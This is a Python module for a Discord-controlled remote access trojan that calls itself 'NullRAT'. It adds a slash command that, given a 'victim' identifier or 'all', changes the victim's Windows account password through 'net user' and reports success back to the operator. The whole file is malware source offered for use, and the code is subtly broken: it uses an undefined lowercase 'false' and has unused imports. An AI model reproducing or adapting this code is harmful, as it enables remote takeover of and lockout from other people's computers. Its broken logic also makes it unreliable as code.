import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests, ctypes
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class ChangePass(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command( )
    async def changepass(self, ctx, victim, password):     
        """Changes the password of victim's windows profile. Admin required
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        password: New password to change for running user
        """
        
        if str(victim) == str(self.bot.identifier) or str(victim).lower() == "all":
            # Admin detection, this command will not work for regular users (apparently) 
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == false:
                return await ctx.followup.send("NullRAT is not running as admin. Operation aborted")
            
            status = os.popen(r"net user %username% " + password).read()
            if "success" in status.lower():
                return await ctx.followup.send(fr"Success: Password changed to {password}")
            
            return await ctx.followup.send(fr"Unspecified error! Log: {status}")

def setup(bot: commands.Bot):
    bot.add_cog(ChangePass(bot))
